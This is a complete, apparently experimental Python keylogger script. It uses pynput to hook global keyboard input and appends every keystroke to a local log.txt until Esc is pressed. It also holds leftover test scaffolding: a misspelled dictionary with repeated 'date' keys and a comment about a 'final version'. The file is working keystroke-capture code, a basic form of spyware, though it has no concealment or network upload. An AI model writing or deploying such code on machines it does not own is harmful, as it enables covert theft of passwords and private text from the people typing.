import pynput
from pynput.keyboard import Key, Listener
from datetime import datetime
import json

count, keys, fianl_log = 0, [], {'date': 'keys go here', 'date': 'did it work?', 'date': 'is it just doing the last one?'}

def on_press(key):
	global keys, count
	keys.append(key)
	count += 1
	
	if count >= 1: #change to a bigger number for the final version
		write_file(keys)
		write_log(fianl_log)
		count, keys = 0, []



def write_log(fianl_log):
	with open("tester.json", "w") as jf: 
		json.dump(fianl_log, jf) 



def write_file(keys):
	with open('log.txt', 'a') as f:
		for key in keys:
			k = str(key).replace("'", '')
			if k.find('space') > 0:
				f.write(str(' '))
			elif k.find('Key') == -1:
				f.write(k)
			else:
				f.write(' '+k[4:]+' ')


def on_release(key):
	if key == Key.esc:
		return False


with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()